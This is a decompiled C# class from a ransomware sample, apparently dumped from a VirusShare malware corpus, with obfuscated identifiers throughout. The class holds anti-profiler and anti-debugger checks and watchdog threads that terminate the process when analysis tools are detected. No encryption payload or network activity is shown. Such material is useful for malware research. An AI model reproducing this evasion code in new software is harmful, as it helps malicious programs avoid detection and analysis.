// Decompiled with JetBrains decompiler
// Type: 딼탅⑳䎴躠确崆
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA9A5647-A48B-43F0-8A2B-5C455466EE1E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.hzrg-622e9302a6f8c01ab665fedaee6c687ed2024544f390b81ebb941db7afbfa850.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

internal static class 딼탅\u2473䎴\uF31B躠确崆
{
  [DllImport("ntdll.dll", EntryPoint = "NtQueryInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  private static extern int 䵭䨰\uE576Ң䶈뷸䶉햪(
    IntPtr _param0,
    int _param1,
    byte[] _param2,
    uint _param3,
    out int _param4);

  [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  private static extern uint \uFFFD\u2A7D匨ꊪ튮\u2FEE\uFFFD\uF4EB(
    IntPtr _param0,
    int _param1,
    byte[] _param2,
    uint _param3);

  [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
  private static extern bool \uFFFD㡩榴瞞㝤믖㐁浮(IntPtr _param0);

  [DllImport("kernel32.dll", EntryPoint = "IsDebuggerPresent")]
  private static extern bool 鯖㢴愺븱뛬걶筄ꪭ();

  [DllImport("kernel32.dll", EntryPoint = "OutputDebugString")]
  private static extern int 멫㹵鑵袦\uEFA5잽ց\uF7FA(string _param0);

  public static void 聛\u21C4鈑ㅯ\uFFFD辥盋㳍()
  {
    if (Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING") != null || Environment.GetEnvironmentVariable("COR_PROFILER") != null)
      Environment.FailFast("Profiler detected");
    new Thread(new ParameterizedThreadStart(딼탅\u2473䎴\uF31B躠确崆.労\u2285\uE2FC乼\uF68F\u3217땀Ȣ))
    {
      IsBackground = true
    }.Start((object) null);
  }

  private static void 労\u2285\uE2FC乼\uF68F\u3217땀Ȣ(object _param0)
  {
    if (!(_param0 is Thread thread))
    {
      thread = new Thread(new ParameterizedThreadStart(딼탅\u2473䎴\uF31B躠确崆.労\u2285\uE2FC乼\uF68F\u3217땀Ȣ));
      thread.IsBackground = true;
      thread.Start((object) Thread.CurrentThread);
      Thread.Sleep(500);
    }
    while (true)
    {
      if (Debugger.IsAttached || Debugger.IsLogging())
        Environment.FailFast("Debugger detected (Managed)");
      if (!thread.IsAlive)
        Environment.FailFast("Loop broken");
      Thread.Sleep(1000);
    }
  }
}
